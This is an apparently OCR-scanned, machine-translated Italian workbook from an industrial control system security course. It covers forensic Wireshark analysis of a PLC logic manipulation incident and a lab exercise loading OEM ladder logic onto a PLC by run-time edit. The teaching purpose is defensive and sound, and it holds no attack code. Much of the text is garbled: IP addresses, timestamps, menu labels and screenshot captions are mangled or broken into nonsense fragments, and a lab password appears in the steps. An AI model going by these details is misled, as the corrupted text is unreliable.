 10.10.10.20 51393 10.10.20.10 44818 9 598 5 3 10.10.10.20 57617 10.10.20.10 21 4 252 2 1 10.10.10.20 57620 10.10.20.10 22 4 252 2 1 10.10.10.20 57623 10.10.20.10 23 a 252 Zz 1 10.10. 10.20 57625 10.10.20.10 25 ct 252 2 1

*Nota* Vediamo che il 10.10.20.10 ha le porte TCP 44818 e 80 aperte. Altre porte come la porta TCP 21, 22, 23 e 25 hanno solo 4 pacchetti che erano il SYN seguito da RST, il modello ACK che abbiamo visto in precedenza indicando che è chiuso.

© 2021, Robert M. Lee Lab 3.3 -4

(B) oh
 UN
 CU Tt ​​|

*Risposta* Porta TCP 44818 e porta TCP 80 3. Qual è lo strumento utilizzato per interagire con il PLC? pycomm

*Nota* Sulla base dei laboratori precedenti sappiamo che la versione 10.10.10.30 è stata compromessa e un file di progetto dannoso è stato trasferito su di essa dall'avversario. Un punto di partenza naturale per determinare cosa è successo subito prima che avvenissero le comunicazioni tra il 10.10.30 e il 20.10.10, soprattutto se c'è stata qualche manipolazione logica.

> Rivedere le comunicazioni tra il 10.10.10.30 e il 10.10.20.10
> Applica il filtro ip.addr==10.10.10.30 && ip.addr==10.10.20.10
> Fare clic sul primo pacchetto
> Fare clic con il tasto destro e seguire > Flusso TCP
 i —————— File Modifica Visualizza Vai Acquisisci Analizza Statistiche Telefonia Wireless Strumenti Guida A464@m@ RGOQAK VHA.

& indirizzo.lip==10.10.10.30 && indirizzo ip==10.10.20.10
 Nessuna ora ~ Destinazione Protoc 1 9.000000 10.10.19.30 10.10.20.19 cIP 2 8.001201 10.10.20.10 10.10.10.30 TCP 3 0.004695 10.10.20.10 10.10.10.30 CIP 4 0.16 3838 10.10.10.30 10.10.20.10 TCP 33 0.494983 10.10.10.30 10.10.20.10 CIP 34 6.499400 10.16.20.10 10.10.10.30 TCP

*Nota* Questo filtrerà la sessione fino a tcp.stream eq 0 come filtro. Esistono numerosi flussi e sono ordinati numericamente a partire da 0. Sfortunatamente, vediamo che questo flusso non ha nulla di utile.

(nse u” BBAC>
 Wireshark: segui il flusso TCP (tcp.stream eq 0)
 otincide.pcap
 4 @.103838 ] 33 6.494983 |
 34 8.499406 Bt Ste 35 0.499416 }
 59 6.665626| es
|

|
 144 1.167166 j Frame 1: 242 byte su cavo (1936 bit), 24 Ethernet II, Src: Dell_3c:53:0b (f8:db:88: Internet Protocol Version 4, Src: 10.10.18 Transmission Control Protocol, Src Port: 2... Ethernet/iP (protocollo industriale), protocollo industriale comune Sessia
 80 ©0 be 5a 72 ce fa db 68 3c 53 eb f
© 08 ed b7 84 40 69 GO BG 10 54 Oa Gat

© 2021, Robert M. Lee Lab 3.3-5
> Filtra su tcp.stream 1
 Esci dalla finestra TCP Stream che era aperta Applica il filtro tcp.stream eq 1
 Fare clic sul primo pacchetto
 Fare clic con il tasto destro e seguire > Flusso TCP Esaminare il traffico
 VVVVV

. 369657 18.18.10.26

+ 373803 18.10.16.26 «COMM. +562-2
 9 8.375686 18.10.20.16
 16 6.375867 16.10.10.20
 11 6.377849 10.10,20.18
 12 6.378051 10.10.10.20 13 6.385692 16.10.20.18
 14 8.385989 16.10.26
 15 8.388742 10.10.20.16 16 6.389941 16.16.10.20
 ame 5: 66 byte su cavo (528 bit), 66 B II, Src: Dell_3¢:53:0a (f8:db:88 protocollo iternet versione 4, Src: 10.10.14
«Protocollo di controllo dell'ammissione». porto: 4

*Nota* Qui vediamo che pycomm è sul 10.10.10.20 e interagisce con 10.10.20.10 che è il Burner Management System. Inoltre è chiaro che ci sono molti valori tra cui livelli, timer, ritardo e avvio che potrebbero interagire. Sembra che Engineering Workstation stia sfruttando uno strumento basato su Python, che abbiamo visto trasferire in precedenza dall'avversario, per interagire e modificare i valori sul PLC.*Nota* Di solito ci sono troppi flussi (e anche qui) per scorrere manualmente ciascun flusso. È qui che sono utili strumenti e analisi più avanzati. Tuttavia, possiamo tornare rapidamente dove dobbiamo essere concentrandoci esplicitamente sulle comunicazioni CIP sapendo che è così che l'Engineering Workstation interagisce con il PLC.

*Rispondi* pycomm
 4. Qual è la causa principale dell'impatto sulla struttura? Logica manipolata sul controller di sicurezza
> Analizzare le comunicazioni CIP

> Applicare un filtro per enip
> Revisione ad alto livello senza entrare ancora nei dettagli del pacchetto

* Fonte
 Informazioni sulla lunghezza del protocollo i: 10.18. “Pacchetto di servizi multipli CIP 242: Ottieni elenco attributi, Ottieni attributo Li. 10.10. cIP 319 Operazione riuscita: pacchetto di servizi multipli: ottieni elenco attributi, ottieni att... 10.10. Sessione Registro ENIP 82 (Req), Sessione: 6xe9980000 10.10. Sessione Registro ENIP 82 (Rsp), Sessione: 6x10024166 10.19. ENIP 78 Elenco Identità (Obbligatorio) 10.18. ENIP 129 Elenco identità (Rsp), 1756-ENBT/A 10.16 cIP CM 114 Invio non connesso: Identità - Ottieni tutti gli attributi 16.10 cIP 144 Successo: Identità - Ottieni tutti gli attributi 14 9.385989 10.10. Gestore connessione cIP CM 146 - Inoltro grande aperto (router di messaggi) 15 8.388742 16.10. cIP CM 98 Servizio non supportato: Connection Manager - Large Forward Open 16 8.389041 16.10. Gestore connessione cIP CM 142 - Inoltro aperto (router di messaggi) 17 6.398508 10.10. cIP CM 124 Operazione riuscita: Connection Manager - Inoltra aperto
© 2021, Robert M. Lee Lab 3.3-6
 UN)
 ehi

> * & &
 ex & & ww
 7 m7oanqqeneqnneeeeee® ® ae we w F&F
 ua ie’ Lt Ui Lt i U
 Le
 uC VS Vw noi Ww

*Nota* Sarebbe utile avere un registro di tutti i comandi e i valori inviati nell'acquisizione del pacchetto pre-incidente e identificare eventuali anomalie o differenze ora che sappiamo che questa acquisizione del pacchetto contiene un incidente. Potresti scrivere uno script per ottenere questo risultato o utilizzare uno strumento professionale, ma per motivi di tempo e semplicità possiamo generalmente ricordare che c'erano molti comandi nell'acquisizione dei pacchetti pre-incidente relativi a Multiple Service Packet, TimeDelay Successes e simili, e Sessioni registrate e non registrate. Puoi ordinare per Informazioni e vedere i diversi comandi in Wireshark, ma prima possiamo vedere se qualcosa risalta nell'acquisizione.

*Nota* Scorri rapidamente trascinando la barra di scorrimento all'estrema destra di Wireshark.
 Informazioni sulla lunghezza del protocollo di destinazione

*Nota* Verso la fine dell'acquisizione vedrai molte ritrasmissioni spurie TCP. In sostanza, le comunicazioni CIP non sono più attive o sembrano essere offline. Lo esamineremo più da vicino nella prossima domanda. Per ora, scorri fino al punto immediatamente prima delle ritrasmissioni e vedi se riesci a identificare qualcosa di interessante.

*Nota* Scorrendo lentamente verso l'alto dall'inizio delle ritrasmissioni possiamo vedere alcuni messaggi di stato che si distinguono per quello che sono e per il fatto che non erano nella cattura dei pacchetti pre-incidente. Quello che risalta di più è il messaggio Trasferimento parziale: stato del servizio.
 Destinazione _ ____ Informazioni sulla lunghezza del protocollo:
 10.10.10.20 Trasferimento parziale cIP 598: Servizio (0x55) 10.10.20.18 Classe cIP 122 (Ox6b) - Servizio (0x55) 10.10.10.20 Trasferimento parziale CIP 55/7: Servizio (0x55) 10.10.20.10 Classe CIP 122 (®x6b) - Servizio (0x55) 10.10.10.20 Trasferimento parziale cIP 596: Servizio (@x55) 10.10.20.10 Classe CIP 122 (0x6b) - Servizio (x55) 16.10.10.20 Trasferimento parziale CIP 558: Servizio (0x55) 10.10.20.10 Classe CIP 122 (@x6b) - Servizio (0x55) 10.10.10.206 CIP 588 Trasferimento parziale: Servizio (0x55) 10.10.20.10 cIP 122 Classe (®x6b) - Servizio (0x55) 16.10.10.20 cIP 567 Trasferimento parziale: Servizio (0x55) 18.10. 20.10 Classe cIP 122 (Ox6b) - Servizio (0x55)

*Nota* Questo messaggio indica che è in corso un trasferimento di dati tra la workstation di ingegneria e il PLC, il che è indicativo di una modifica logica. Questo di per sé non è anomalo, ma durante le operazioni e non durante una finestra di manutenzione diventa un po' più anomalo. Tuttavia, nel contesto di ciò che sappiamo sul file di progetto infetto presso la Engineering Workstation, ciò costituisce un valido esempio della causa principale dell’impatto sulla struttura: la modifica della logica del PLC dalla Engineering Workstation.

*Risposta* La logica del PLC è stata infatti manipolata dall'EWS
© 2021, Robert M. Lee Lab 3.3-7 5. Informazioni su quando il PLC va offline e perché è probabile che sia ancora visibile in rete? 2020-07-16 23:31:29
 Il PLC si è bloccato ma la scheda di rete è rimasta online
 A questo punto non vogliamo vedere solo le comunicazioni ENIP ma qualunque comunicazione tra il PLC e l'Engineering Workstation.

> Analizzare esplicitamente le comunicazioni CIP tra il 10.10.10.30 e il 10.10.20.10 Applicare un filtro per ip-addr==10.10.10.30 && ip.addr==10.10.20.10
 Scorri fino al punto in cui avviene la maggior parte delle ritrasmissioni
 Selezionare Visualizza > Formato di visualizzazione dell'ora
 Scegli il formato che desideri utilizzare, ad esempio "data e ora dell'anno"
 Esaminare i risultati
 VVVV WV

| 4594... 3445.508667 16.10.30 20.10.10 TcPe 541746 —~ 44818 [ack] Se
.. 3453 .508588 10.18.20.10 10.10.16.30 60 44818 - 1746 [ACK] Se 0 3453 . 508599 10.10.18.30 10.10.20.10° = e

.. 3455 .562230 10.10.20.10 10.10.10.30 60 44818 ~ 1746 [ACK] Se

| 4596... 3455.575476 10.10.20.10 10.10.10.30 TcP 60 44818 - 1746 [ACK] Se

¥ Barra degli strumenti principale =: A, 5 =
 Barra degli strumenti Filtra
=] 0 Barra degli strumenti wireless iv) Barra di stato

~ Protocollo "Informazioni sulla lunghezza".

| 10 cIP 242 Pacchetto di servizi multipli: ottieni attributo Li
| ©) Schermo intero Fil |30 TCP 60 44818 -- 1746 [ACK] Seq=384617 Ack=284279 '
¥) Elenco pacchetti \10 TcP 54 1746 ~ 44818 [ACK] Seq=284279 Ack=384618 '
. : ~ 4 30 TCP 60 44818 - 1746 [ACK] Seq=384617 Ack=264279 |
(¥| Dettagli pacchetto 16 TCP. 54.1746 44818. [ACK] Seq=284279 Ack=384618 lv Byte pacchetto Ey-y Ten. BO AAQAD 4746 PACU Coa =20 4612. Aol —2042990.! Formato visualizzazione ora Data e ora del giorno (1970-01-01 01:02:03.123456) ctri+aAlt+1 Risoluzione nome » i Anno, giorno dell'anno e ora del giorno (1970/001 01:02:03.123456) Zoom » | Ora del giorno (01: 02:03.123456) Ctrl+Alt+2
.| Espandi Sottoalberi Maiusc+Destra | Secondi dal 1970-01-01 ctrl+Alt+3 4 Collanse Suhtrees ShiFrat eft | ® Secondi dall'inizio dell'acquisizione Ctrl+Alt+4

. 2020-07-16 23:31:27.514751 19.10.10.30

. 2020-07-16 23:31:29.568382 10.10.20.10

© 2021, Robert M. Lee Lab 3.3 -8
 aay @,
 a, a, @) aw, a, ey) @)

@)

= Ss 3 Bh ​​8 eee od eee eed mT rT a mT a cw oT _w
 1 secondo
 ce
 vedi ap
 4B

“ap “5 “5 ty

*Nota* Ciò mostra che l'ora è all'incirca il 16-07-2020 23:31:29 UTC quando le ritrasmissioni hanno iniziato ad avvenire in modo coerente.

*Nota* È un po' difficile identificarlo con certezza, ma ciò che sembra accadere è che il PLC si è bloccato. Mentre si scorrono le ritrasmissioni possiamo vedere che il PLC in realtà è ancora sulla rete e ha comunicazioni TCP con 10.10.10.30 ma le comunicazioni CIP effettive non funzionano più.
 16.10.20.10 10.10.10.30TCP
 10.10.10.30 10.10.20.10TCP
 10.10.20.10 10.10.10.30TCP

*Nota* Ciò che probabilmente è successo (e potrebbe essere confermato localmente sul sito) è che il PLC stesso si è bloccato ma la scheda di interfaccia di rete sul PLC è ancora online. Ciò indica che la logica del controller stesso è danneggiata, il che ha senso nel contesto di ciò che sappiamo. Ciò che non sappiamo però è se l'avversario intendesse o meno mandare in crash il controller. In genere esistono modi più semplici per mandare in crash un controller piuttosto che manipolarne la logica. . °

*Risposta* 2020-07-16 23:31:29 e probabile crash del PLC ma la scheda di rete è rimasta online

© 2021, Robert M. Lee Lab 3.3 -9 i, Ces CO! CO! CO Co Oh Ld
 dobbiamo w& Ww wb we wo w
 Vv vw vw
 Obiettivi
 e Scaricare il PLC con un nuovo file di logica ladder senza interrompere il processo e Analizzare tramite strumenti di monitoraggio della rete se il PLC è stato scaricato e —_ Testare la nuova funzionalità logica del PLC
 e Trova indizi per determinare cosa c'è di diverso

*Informazioni sullo scenario* L'OEM della turbina a combustione (CT) ha richiesto l'aggiornamento del sistema di controllo PLC. Nello specifico, l'OEM ha apportato modifiche alle funzionalità di controllo della valvola del carburante CT e, dopo i test, ha inviato a te, ingegnere, un file logico ladder PLC rivisto da scaricare.
 L'OEM ha indicato che il file di logica ladder può essere scaricato come "Run Time Edit". Come ingegnere, sai che una "Modifica in fase di esecuzione" consente al PLC di continuare a funzionare durante il download del PLC in modo che il download non influisca sul resto del sistema. In passato, si scaricava il codice PLC interrompendo l'esecuzione del codice da parte del PLC, si scaricava il codice e si riavviava il PLC in esecuzione ponendolo in modalità Run. In questo specifico scenario di laboratorio, desideri scaricare il codice di nuova generazione senza interrompere la trasmissione e la distribuzione. Eseguendo una “Rur: Time Edit”, ciascun sistema dovrebbe continuare a funzionare senza alcun effetto.
 Dopo che il ruolo di ingegnere ha scaricato il nuovo codice PLC OEM, l'ingegnere verificherà il funzionamento dell'HMI e lavorerà con un tecnico sul campo per verificare le operazioni sul campo.
 Questo laboratorio utilizzerà il sistema SANS I.C.S. VM Windows e kit PLC
 Attività: scaricare la logica ladder di modifica del fornitore OEM nel PLC
 Hai già scaricato PLC Ladder Logic, ma questa volta eseguirai una "Modifica runtime" in modo che lo stato dei sistemi di trasmissione e distribuzione non venga influenzato.

> Caricare il file della logica operativa nel PLC
> Apri la macchina virtuale Windows
> Individuare il file nella cartella ics515: "I.C.S.515 OEM Change V2.ckp"
> Fare doppio clic sul file per avviare il software di programmazione CLICK con il progetto

© 2021, Robert M. Lee Lab 3.4-1 Software di programmazione CLICK (Versione 3.01) - I.C.S.515¥10 Modifica OEM per Production Boards.ckp - [Programma principale] Fie "Homes tlt Visualizza Impostazione Finestra istruzioni Progtam PLE
 leedhcnd - = ag Cursore | Commenti sul ramo
©) Indirizzo Commenti cou
“Soprannomi signori
 Turearnee Somme PyWrte Progetto 81K Houle,
"Collega £ 3 informazioni | £°)PLC Evo

© Riferimento incrociato eet
 Sotto | Rede
 ascia
 sì, 3 risposte
 Ca NT ar
 Programma Funzione PLC Taso Programma ladder rs | Bsc
 eee
 Tutto.Avviare | |Ea6} Contatto (NO)
 123 Programma principale Az 1 dl Subroutine Pregram - i WA BrestetModele

|B Contatto (NC) Cal “i Contatto bordo

'et Distinguere gli allarmi 2
*DistindStates istindustriat |
 Genstates ipa Confronta

‘| = DictResAlsrm= | 124 DistRental
$4 DistResstates
 eee = Generazione
 Catt
 AI Gen _Fuel_Controt 1+] M4 GenAlarms 1 |B Generazione

> Gen Fuel_Conticl
 Un allarme
 Ed Genstetes
| hs Iniziato
| A cura di RemoteCommwD
 cal M, reanStates

»Una trasmissione SESSO di TeansAlams
|| bh Trasduttore >
 Chiamata
 1B Programma di interruzione sotto
© Selettore indirizzi
| F Modifica commenti rung A
 Trasmissione
 Chiamata,
 Sy Local Program informatico! | |_—_
& Controllo sintassi | Vista dei riferimenti incrociati 6
 TancAlarms
 Chiamata
 89 Monitorare i | Stato JB Monitora visualizzazione dati Se

> DietResStates
 52, pistResiential

~ Peteview delle risorse umane! sonore FS Visualizzazione testo
 Chiamata
 ER Sposa Visualizza | 2 Ignora vista Oe coe

(Bet ieteger al integere2 parole)

[Bl Ficating pomt BlHex (Det
 DistResAlarms
 c-o1cPu. ee): *

{Al Ascii — 9000/8000

> Quando si apre l'applicazione, trova nel menu in alto l'icona con la freccia rossa verso il basso che ti serve
 Scrivere un progetto in un PLC
 Finestra: Aiuto

(El Style + - ta) <> Offline FP status mile Fs Modalità PLC... [Visualizzazione dati

> Apparirà una schermata di connessione, potrebbe essere necessario selezionare Ethernet nel menu a discesa Tipo di porta e potrebbe essere necessario selezionare l'adattatore nel menu a discesa Adattatore di rete. Se non vedi il
 adattatore nel menu a discesa, sarà necessario riassociare l'adattatore da USB a Ethernet all'host
 nuovamente e riavviare il tentativo di connessione. Dovresti vedere un PLC che è stato scoperto.

[connetti a CLICK PLC x Ths Computer Connessione diretta pettwe: aes Posizione del CLICK PLC Netecck Adapters sea aay Sean RE ROL Intel(R) 82574. Gigabit Network Connecton. al di fuori di questa LAN (è necessario assegnare manualmente l'indirizzo IP e il numero di porta.) Pat othe [ picieme Paden | Srboettiack |Parttember | Frowere |jode Senn | Indirizzo Macaddess B: 192 168.0.8 Maschera di sottorete: 255.255.255.0 Gateway predefinito: 0.0.0.0 |
| Aggiorna i LED SKRUN BERR Edt.
cono [cometa] He
© 2021, Robert M. Lee Lab 3.4-2
 Ce, @,

(2 noi noi WB wo we oe Oy wy we
 Fare clic sul pulsante Connetti. Immettere la password "sansics123".
 VVV
 il programma verrà sostituito con il nuovo programma.
 Scrivi il progetto nel PLC

°C Dimensioni del programma (totale: 8.000 passi)
@iProgram Dimensioni: 1.254 passaggi (15,67%) Area irre: 6.746 passaggi (84,33%)
 Min F)

°8.000|
 File di progetto (totale: 262, 144 byte)
 Dimensione file WiiProject 41.216 byte (15,72 %) Area GiFree: 220.928 byte ( 84,28 %) 0 262.144 Ultimo aggiornamento: 29 giugno 2021, 21:21:17 File di progetto Wivarite nel PLC
 Abilitando questa opzione, il file di progetto verrà scaricato (Scrittura) nel PLC. Se vuoi disabilitare il caricamento del progetto (lettura), disabilita questa opzione.
 Dimensione programma: 1.220 passi (15,25%) WiFree Area: 6.780 passi (84,75%) C) 8.000

‘Progetto Fie (totale: 262, 144 byte)
 Dimensione file iProject 40.624 byte (15,49 %)
 Area filo: 221.520 byte (84,51%)

° 262, 144 Ultimo aggiornamento: 3 29,2021, 20:41:15
 Abilitando questa opzione, il programma verrà scaricato nel PLC senza passare dalla modalità PLC alla modalità STOP.
 me ea ae

> - Conferma di voler procedere con la modifica del tempo di RUN
 Conferma modifica ora RUN
 Quando richiesto, selezionare "Run Time Edit" in modo che il programma PLC continui a funzionare come il vecchio
 se
 Stai per eseguire una modifica del tempo di RUN. Se si preferisce mettere il PLC in modalità STOP quando si scarica il progetto, selezionare il pulsante Annulla e deselezionare l'opzione Modifica ora RUN nella finestra Scrivi progetto nel PLC.
 Non visualizzare più questo messaggio fino al successivo avvio del software.

> Selezionare Procedi modifica RUN time per scaricare il Click PLC
 Sssww
 COME'

© 2021, Robert M. Lee
 Lab 3.4-3 Discrepanza del progetto
 prima di eseguire il nuovo progetto. PC —_—_____ _ Nome progetto: [I.C.S.515 OGM Change v2
 Dimensioni del programma (totale: $.000 passi)
 Dimensione GiProgram: 1.254 passi (15,67%) Area WiFree: 6.746 passi (84,33%)
°8.000
 File di progetto (totale: 262, 144 byte) Dimensione file WBProject 41.226 byte (15,72 %)
 Area WiFree: 220.918 byte (84,28%) |
° 282.144 Ultimo aggiornamento: Ad 29,2021, 20:24:54 Arresta il PLC e scarica il progetto

'Stai per scaricare un progetto diverso nel CLICK PLC che attualmente è in modalità RUN. In questo caso, potresti voler scaricare il progetto in modalità STOP, quindi il PLC CLICK inizializzerà la memoria
 Nome progetto PLC: [Test di accettazione del sito I.C.S.515 Vi__|
 Dimensioni del programma (totale: 8.000 passaggi)
 BBDimensione Programma: 1.220 passi (15,25%) WiFree Area: 6.780 passi (84,75%) 0 8.000
 File di progetto (totale: 262.144 byte) Dimensione file MiProject 40.614 byte (15,49 %)
 Area libera: 221.530 byte (84,51%)
° 262.144 Ultimo aggiornamento: 2d 29,2021, 12:34:12

> Verificare che il nuovo codice PLC OEM sia stato scaricato
> Verificare che l'intestazione della finestra indichi "I.C.S.515 OEM Change V2.ckp”
 Breakerodee 7% cancella HN Cesare ely Tiras

$f Dieta FesnotahittBalay Es Disindsiates am
 reat F9 HE
 Sed Dintrat }
 Rema HY Centro Dey Tamar
 New York
 eh Transeo BW hrcenrupt Pregeam

@ hasdvess Picker di Fe Rung Commenti 1} Leeal Program Infor 1 Synten Check

© Cros Rater Visualizza 2 Monier BF satus Monster | C5518 OFM Modifica V2 - 0 errori, avvisi C} HE 0a vista “mm TB Detavewt Scrivi progetto ite PLC. 5 ot Yew + [tanza completata
 Intere di generazione su:
'0:Generazione interi
 Bek Dloese Bisteeitvorts Blrowing poe ie Mien ci mun
 ieee ene. UN,

> Se il tuo FTVlew HMI non è in esecuzione, individua il collegamento "Esegui HMI" sul desktop della VM Windows

> Fai clic su Sì nel prompt e attendi: stanno accadendo cose belle, potrebbero essere necessari 10 secondi, sii paziente

© 2021, Robert M. Lee
 Laboratorio 3.4-4
 un iN iN
 UN,

@

) ehm noi
 ve noi o noi noi
 noi noi ww
 ww
 Sostituisci la directory di sistema locale
 La directory di sistema FactoryTalk dell'applicazione per utenti e policy verrà caricata su questo terminale. La FactoryTalk System Directory esistente verrà archiviata e verrà ripristinata automaticamente dopo la chiusura dell'applicazione runtime.
 Chiudere tutti gli altri programmi che stanno attualmente accedendo alla directory FactoryTalk locale. Selezionare SÌ per continuare o selezionare NO per annullare
 il caricamento di questa Applicazione. Sì No F7 [Fa]
 DecomprimereMER.dil in FactoryTalk Linx
 Editore verificato: Rockwell Automation Origine del file: disco rigido su questo computer
 Mostra più dettagli

> Selezionare il pulsante "Esegui applicazione".
 FactoryTalk View ME Station - 10.00.00.290(Patch 03)

[ iessieva mer

|

| Carica applicazione Esegui applicazione Impostazioni applicazione i Fl IF2] iF3]

‘
 Elimina file di registro
 Impostazioni del terminale prima di eseguire IFS)

[Fa]

© 2021, Robert M. Lee
 Laboratorio 3.4-5
> Una volta caricato l'HMI, verrà visualizzata la schermata principale. A seconda di come hai lasciato il sistema, tu
 vedrà lo stato degli interruttori, i carichi dell'area Residenziale e Industriale.
 HMI del sistema BE Power - Principale [limite di 2 ore]
 Generazione

|
 T n 'Trasmissione, un Intertie LEH 1 MW Commutatore di uscita: Relè di protezione dell'interruttore Aperto Chiuso 1 Aperto Chiuso | Ripristino guasto
 Neeev, 1 NU“e Nat 2
|
 7\| | 7 _~* fN 1
 Min <> Max Ey wn
} Misuratore di potenza ABR (96)
© 2021 SANS 1 9 Prodotto negli USA Indust
 N\ / Richiusura Aperto Chiuso 4 \
\ / Carico
~~| Min <> Max 7 N
{OP AS
 Distribuzione
 Ora della sveglia
‘pei2021 35542 PH 79912021 3:49:27 PUL 79/2021 3:48:27 PH yysa021 3.4438 Pu 77872021 14:10:48 Pid 79012021 14:10:48 PH 7eie02 188.32 PM

«Riconoscilo
 Messaggio Genere allarme critico valvola carburante (alion è un allarme critico
 Generatore locale Nott Min per chiusura interruttore
 Ora garantiremo che le aree di trasmissione, residenziale e di distribuzione industriale siano operative
 prima di condurre i test sull'area di generazione
 Chiudere l'interruttore industriale
 Verificare che l'interruttore Sim 8 - Modalità esperto sia impostato sulla posizione "On".

> Passare alla schermata industriale e chiudere l'interruttore industriale
> Per questo passaggio, lascia entrambe le raffinerie spente
 Residenziale
 Massimo |
 Industriale
 Tendenze
 90/07/2024
$ 4802 PM
 uw Raffineria B
% SU
 ae al su |

© 2021, Robert M. Lee
 Laboratorio 3.4-6
 a, a, (?, ce, ae,
 qe) ve

~_ w ws
 oe ws «a «5 “a

> Chiudi Richiusura residenziale

> Passare alla schermata Residenziale

> Chiudi Richiusura
 Generazione

'Ora sveglia' Acenowiedge ime 77972021 10:50:13 Pit

“Trasmissione
e distribuzione
 Residenziale Industriale
 Strada della Casa sul Lago
 Strada del Lago Piacevole
 Via della trota di lago
 Messaggio
 vate Cr Area di generazione Allarme critico Generatore locale NotAt Min Far Interruttore chiuso
 Tendenze
 Login

~ Carico corrente
 Carico massimo
 71912024 22:56:32.
 0 ora
 400| MW.
 Generazione
 Tr
e distribuzione
 sione
 Residenziale Industriale
 Strada della Casa sul Lago
 Strada del Lago Piacevole
 AR,
 Via della trota di lago
 Chse

~~ Carico corrente
 Carico massimo
 71812024 58 PM
 Ea
 400| MW
 Orario allarme Orario riconoscimento 09/07/2024 0:50.13 PA
 Messaggio Allarme zona residenziale critica
 Min. Natt generatore locale per interruttore chiuso
'Allarme critico nell'area di trasmissione
“La generazione è un braccio critico
 jeee |

© 2021, Robert M. Lee

> Chiudere l'interruttore Lambda della trasmissione e ripristinare il relè di protezione della trasmissione Lambda
 Laboratorio 3.4-7
> Passare alla schermata Trasmissione e distribuzione
> Chiudere l'interruttore della trasmissione Lambda
> Ripristina il relè di protezione della trasmissione Lambda
 BE Power System HMI - Trans_Dist [Limite di 2 ore} “i
 Generazione principale Tendenze allarmi industriali identiche Trasmissione e distribuzione Generazione 280 MW -- i
 arr |
(eo) |) Lamda
| Casa del potere
 TRASFERIMENTO AUTOBUS
 Lambda | "Trasmissione aperta."
 Protezione - Ser” (o) =] |
 Consumo MW 0 %
 Arai ime Aemowledgetime _ Wessage 0:
 7912021 15:55:42 7902024 15:49:27
 71912021 2:10:48 PUL

> Resettare eventuali allarmi premendo fisicamente il pulsante “Reset Allarmi” presente sulla scheda C3PO
 BB Power System HMI Trans_Dist [Limite di 2 ore] = x
 7igi2021 Generazione Residenziale Industriale 23:08:33
 TRASFERIMENTO AUTOBUS
 Lamda
 Richiusura

—|—_

'Alaim time' Riconoscimento del messaggio in tempo

? 77072024 es 43Pu Allarme critico area residenziale 77912024 3:55:42 PL Allarme critico valvola carburante 790/202 15:49:27 PM ‘Allarme critico area di generazione 792021 249.27 PM Generatore locale NotAt Min per interruttore chiuso a 79/2021 15:48:38 PM ‘Allarme critico area di trasmissione 7792021 14:10:48 PM Allarme critico area di generazione
© 2021, Robert M. Lee Lab 3.4-8
 RD BD BO BO PB

> >®
 eo ee @
 eo
 e, ip 7 ou
 ww
 Bs 4s ae come 45 ae ns a5 is’
 COME

> Dovresti vedere la Grid Board che indica che alcuni o tutti i LED delle case residenziali sono accesi. In caso contrario, ruotare la manopola del potenziometro residenziale completamente in senso orario (massimo) in modo che tutti i LED della casa siano accesi

> Dovresti vedere il Grid Board che indica un valore per l'area di distribuzione industriale. Se il contatore legge zero, ruotare il potenziometro industriale completamente in senso orario (massimo) in modo che il contatore industriale legga circa 20 MW

> Verificare l'operazione di generazione tramite l'HMI di FTView
> Passare alla schermata Generazione
 BB Power System HMI - Generazione [Limite di 2 ore] - x e Trasmissione 2024 Generazione principale e distribuzione Residenziale Industriale Allarmi: Tendenze Accesso 14:13:06 PM EXIT CT Controlli valvola carburante Stato interblocco generazione
© Modalità manuale Apri |
© Modalità automatica Fsitt4) Permissivi dell'interruttore |
@ Local Click PLC e O Generator Runnirg { 0 % Open © OpenPLe BP OS @ Trans Breaker Cosed ineulee Meruel i ° @ Trans. Relè di protezione OpenPLC @ Carico presente Controllo Aria in ingresso Turbina a vapore
|
° A Uscita Turbina di Combustione ] tp 0 |Mw OCT In funzione O AVR On Power Power Power ExpertMode © CT Arrestato @ Modalità Manuale On Consumi Generazione Disponibile Sim 8 " on=Usa pas Star =| Tensione Manuale Industria! 59 | MW Locale 0 MW Locale 0 Mw
= . modalità ames Of = Avvio automatico = =z Regolazione: Setpoint Residenziale 99.) MW intertie 158 MW Intertie 500 mw oH EaSeee] BAAR: 280 | Mw Totale mw Totale [158] mw Totale [500] MW Tempo allarme Tempo conferma Messaggio 7912021 105013 Pia Allarme critico area residenziale 7#912021 22:41.23 PM Allarme area trasmissione Cntcai 77912021 3:55.42 Allarme critico valvola carburante PH 78912021 3:49: 27 Allarme critico area generazione Pd: | 71912021 3.49:27 PU Generatore locale Non l Min per interruttore chiuso 7192021 15:44:28 PM Aree di trasmissione: Allarme 71972021 2:10:48 PUL Area di generazione allarme critico

> Impostare la modalità di regolazione della tensione della turbina di combustione su AVR e i controlli della valvola del carburante CT su PLC locale e modalità automatica

© 2021, Robert M. Lee Lab 3.4-9 BE Power System HMI - Generazione [Limite di 2 ore] = x Generazione principale | ,trasmissione | Tendenze allarmi industriali residenziali ESCI Generazione Interblocco Stato Immersione | | Cavolo @ inerzia Su | pasate: oe SES Breaker Permissivi | O Generatore in funzione |
| ehi? @ Interruttore Trans Chiuso |
| ri Trad. Relè di protezione | eee +4 i
. '; { @ Perdita presente OpenPic lode Modalità 1
| |
| | Turbina a vapore dell'aria in ingresso |
“120 |deg F 0 |uw' OCT Potenza in funzione Potenza Potenza Modalità esperto @ CT Arrestato Consumo Generazione disponibile
«Inizio | Industriale 59 «NW Locale Q Mw Locale | | Mw
. Residenziale 99 | MW intertie [__ 188 | MW Intertie | 500| MW naso | Pais aise MWI Totale uw Totale [ 158 | mw =Totale | 500| MW Tempo allarme 'Tempo di riconoscimento saggio 79/2021 22:50:13 PM Allarme critico area residenziale 7/8/2021 1061.23 PH 'Area trasmissione Allarme critico 719i2021 25642 Pua Allarme critico valvola carburante 749/202 15:49:27 Area Ganerstion Cotticat Harm 79/2021 348.27 PU Generatore locale Nott lin Per Bresker Chiuso 7/9/2021 3.44:38 PIA Trasmissione 4rea Allarme critico 71972021 2:10:48 PA Generazione rea Allarme critico

> Avviare la turbina a combustione premendo il pulsante “Start” e si vedrà l'indicatore “CT in funzione” e il MW di uscita del generatore aumenterà fino a 1 MW.
 2a f&&w&S
 eo®*®&B&B

* Nota: il generatore deve essere in funzione al valore minimo di chiusura dell'interruttore del piazzale prima che l'interruttore del piazzale possa chiudersi. In questo sistema di laboratorio, il valore minimo dell'interruttore di chiusura del piazzale è IMW.
 BB Power System HMI - Generazione [Limite di 2 ore} = x
 e®@®
 Generazione
 Trasmetti
e distribuzione
 Controlli della valvola del carburante CT
 hl
 FornoPte | manst | [00
 O Modalità manuale
© Modalità automatica

% Aprire
 Aria in ingresso
 Generazione
 Tendenze

@ Locale Fare clic su PLC © Generatore in funzione Ct] % Aperto © OpenPLe @ Trans. Interruttore chiuso icin iw H Relè di protezione trans
